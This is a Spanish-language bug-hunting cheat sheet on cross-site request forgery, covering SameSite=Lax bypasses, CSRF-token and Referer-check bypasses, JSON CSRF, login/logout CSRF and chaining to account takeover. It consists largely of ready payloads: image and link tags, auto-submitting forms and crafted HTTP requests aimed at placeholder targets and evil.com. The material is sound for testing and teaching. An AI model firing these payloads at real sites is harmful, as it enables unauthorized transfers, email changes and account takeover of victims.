---
title: "CSRF — Cross-Site Request Forgery"
description: "CSRF fuerza a un usuario autenticado a ejecutar acciones no deseadas."
category: "Web"
date: 2026-07-18
---
# 🔄 CSRF — Cross-Site Request Forgery

CSRF fuerza a un usuario autenticado a ejecutar acciones no deseadas. Con SameSite=Lax como default en navegadores modernos, el vector cambió — no desapareció.

---

## ¿Cuándo es viable en 2026?

```
Cookie SameSite=None      →  Classic CSRF (form auto-submit)
Cookie SameSite=Lax       →  Solo top-level GET navigation
Cookie SameSite=Lax + GET →  Link CSRF
Cookie SameSite=Strict    →  No CSRF cross-site
```

SameSite=Lax permite cookies con **top-level navigations GET**. Si el endpoint acepta GET para cambios de estado → explotable.

---

## Bypass de SameSite=Lax

### 1. GET-based CSRF (si el endpoint acepta GET)

```html
<img src="https://target.com/transfer?amount=1000&to=attacker">
<a href="https://target.com/email/change?email=attacker@evil.com">Click aquí</a>
```

### 2. 307/308 redirect (preserva método POST)

```javascript
// attacker.com/redirect.html
fetch('https://attacker.com/redirect?url=https://target.com/email/change', {
  method: 'POST',
  body: 'email=attacker@evil.com'
})
```

Usar un redirect 307/308 en tu servidor hacia el endpoint POST target.

### 3. Cookie refresh (ventana de 2 minutos en Chrome)

Si la cookie tiene `Max-Age` < 2 minutos, los navegadores la envían en `SameSite=Lax` incluso para form POST. Enviar una petición que renueve la cookie y disparar el CSRF dentro de la ventana.

### 4. Subdominio sibling

Si `app.target.com` tiene SameSite=Lax y `other.target.com` está comprometida → form POST desde el subdominio es **same-site**.

---

## Bypass de tokens CSRF

### Token no vinculado a sesión

```http
POST /email/update HTTP/1.1
Cookie: session=VICTIM_SESSION
Content-Type: application/x-www-form-urlencoded
email=attacker@evil.com&csrf_token=TOKEN_DE_MI_SESION
```

Si el token se valida pero no contra qué sesión → usar tu token con sesión de víctima.

### Token ausente

```http
email=attacker@evil.com&csrf_token=    → 403
email=attacker@evil.com                   → 200  ← vulnerable
```

### Token empt

```http
csrf_token=  →  validado como vacío y aceptado
```

### Double-submit cookie

Si el token está en cookie y el server solo verifica `cookie == request_body` → cualquier XSS o subdomain takeover puede inyectar la cookie.

---

## JSON CSRF

```html
<form method="POST" action="https://target.com/api/user" enctype="text/plain">
  <input type="hidden"
    name='{"email":"attacker@evil.com","__proto__":{}}' value='' />
</form>
```

El `enctype="text/plain"` evita el preflight → el body se envía como JSON con `text/plain`.

---

## Referer-based validation bypass

```http
Referer: https://target.com.evil.com/
Referer: https://evil.com/?https://target.com
Referer:                          # Suprimir con meta refresh
```

---

## Login CSRF / Logout CSRF

### Login CSRF

Crear una cuenta atacante y forzar a la víctima a loguearse con ella:

```html
<form action="https://target.com/login" method="POST">
  <input name="username" value="attacker">
  <input name="password" value="password123">
</form>
<script>document.forms[0].submit()</script>
```

### Logout CSRF

```html
<img src="https://target.com/logout" width="0" height="0">
```

---

## Chaining (CSRF → ATO)

```
CSRF email change → ATO via password reset
CSRF + stored XSS → session theft
CSRF + open redirect → SameSite Strict bypass
Login CSRF + XSS en profile → stored XSS en sesión atacante
```

---

## Herramientas

```bash
# XSRFProbe
xsrfprobe -u https://target.com

# Burp: CSRF token scanner
# Extensión: CSRF Scanner

# Generar PoC
https://security.love/CSRF-PoC-Genorator/
```

---

## Reports públicos

- [GraphQL CSRF via GET - GitLab $3,370](https://hackerone.com/reports/1334474)
- [CSRF token no vinculado a sesión - Stripe $5,000](https://hackerone.com/reports/1196757)
- [SameSite Lax bypass via sibling subdomain - Argo CD](https://github.com/argoproj/argo-cd/security/advisories/GHSA-3jfq-74x2-cx7j)

---

## Relacionado
- **Autenticacion Web** — OAuth CSRF, state parameter bypass
- **Business Logic** — CSRF en transferencias, email change
- **CORS Misconfiguration** — preflight bypass combinado
- **Race Conditions** — CSRF token race
- **SSRF** — JSON CSRF vía SSRF a internal endpoints
- **Subdomain Takeover y Recon Web** — SameSite bypass via sibling
- **WebSocket Security** — CSWSH (Cross-Site WebSocket Hijacking)
- **Claude-BugHunter** (skill `hunt-csrf`)
